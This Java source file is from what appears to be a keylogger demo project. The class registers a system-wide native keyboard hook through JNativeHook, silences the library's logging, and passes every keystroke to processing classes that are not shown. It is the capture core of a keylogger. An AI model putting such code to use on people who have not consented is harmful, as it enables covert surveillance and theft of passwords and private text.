package com.suchocki.keyloggerdemo;

import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import com.suchocki.keyloggerdemo.keyaction.ActionPerformer;
import com.suchocki.keyloggerdemo.keyaction.GlobalKeyListener;
import com.suchocki.keyloggerdemo.keyaction.KeyProcesser;

public class KeyTakerListener {

	private ActionPerformer actionPerformer;
	private KeyProcesser keyProcesser;
	private GlobalKeyListener globalKeyListener;

	public KeyTakerListener(ActionPerformer actionPerformer) {
		this.actionPerformer = actionPerformer;
		keyProcesser = new KeyProcesser(actionPerformer);
		globalKeyListener = new GlobalKeyListener(keyProcesser);
	}

	public void startListening() throws NativeHookException {
		Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
		GlobalScreen.registerNativeHook();
		GlobalScreen.addNativeKeyListener(globalKeyListener);
	}

	public void stopListening() throws NativeHookException {
		GlobalScreen.removeNativeKeyListener(globalKeyListener);
		GlobalScreen.unregisterNativeHook();
	}

}
